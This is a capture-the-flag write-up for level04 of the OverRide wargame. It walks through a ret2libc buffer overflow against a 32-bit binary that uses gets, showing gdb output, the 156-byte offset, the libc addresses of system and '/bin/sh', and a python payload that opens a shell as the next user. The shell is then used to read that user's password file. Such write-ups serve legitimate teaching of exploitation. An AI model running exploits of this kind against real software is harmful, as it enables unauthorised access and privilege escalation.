# level04

We begin the reconnaissance phase by analyzing the binary called `level04`. Upon debugging it with gdb, we discover that it is a 32-bit binary and it utilizes the `gets` function. This function has a vulnerability that enables us to perform a buffer overflow attack. Now, we aim to exploit this vulnerability and execute our attack.

```bash
   0x08048757 <+143>:   lea    eax,[esp+0x20]
   0x0804875b <+147>:   mov    DWORD PTR [esp],eax
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>
```

In our binary system, the fork function is used to generate a child process within which we receive input. The parent process utilizes the wait function to pause its execution and wait for the child process to complete before continuing further.

so let calculat our buffer size .

```bash

(gdb) x/wx $esp+0x20 // adress of var passed to gets
0xffffd650:	0x00000000
(gdb) x/wx $ebp+4 // adress of return adress
0xffffd6ec:	0xf7e45513
(gdb) p/d 0xffffd6ec - 0xffffd650  //calculate the  buffer size
$1 = 156
```

we need the system function to execute our shell command , with the /bin/sh as argument .

```bash
(gdb) p &system
$4 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) info  proc mapping
process 1746
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0
	0xf7fd9000 0xf7fda000     0x1000        0x0
	0xf7fda000 0xf7fdb000     0x1000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000 , "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
(gdb)
```

we find the adress of /bin/sh in the libc `0xf7f897ec `, so we can use it as argument for system function `0xf7e6aed0` .
let buil our exploit and use it to get the flag .

```bash
   python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "BBBB" + "\xf7\xf8\x97\xec"[::-1]'> exploit
   level04@OverRide:~$ (cat exploit ; cat ) | ./level04
   Give me some shellcode, k
   whoami
   level05
   pwd
   /home/users/level04
   cat /home/users/level05/.pass
   3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
